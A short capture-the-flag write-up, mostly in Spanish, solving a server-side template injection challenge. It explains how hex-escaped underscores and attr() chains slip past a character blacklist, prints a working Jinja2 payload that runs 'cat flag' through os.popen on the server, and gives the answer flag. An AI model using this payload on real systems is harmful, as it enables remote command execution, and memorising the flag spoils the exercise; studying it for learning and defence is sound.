# DESCRIPCIÓN:
I made a cool website where you can announce whatever you want! I read about input sanitization, so now I remove any kind of characters that could be a problem :) I heard templating is a cool and modular way to build web apps! Check out my website [here](http://chatelaine.cylabacademy.net:38838/)!

Server Side Template Injection

Why is blacklisting characters a bad idea to sanitize input?
# SOLUCIÓN:
#### academy{sst1_f1lt3r_byp4ss_7d09ff8d}

Para sacar la bandera ejecutamos el payload con puros `\x5f`, que sirven para esconder los guiones bajos y que la página no nos bloquee. Luego metimos los `attr()`, que sirven para ir uniendo las variables sin tener que usar puntos. Y así fuimos escalando entre los permisos hasta ejecutar el `os.popen('cat flag')`, que sirve para correr el comando directo en el servidor y que nos aviente la bandera, y ya.

```

```{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag')|attr('read')()}}
```
# NOTAS ADICIONALES:

# REFERENCIAS:
https://webshell.cylabacademy.org/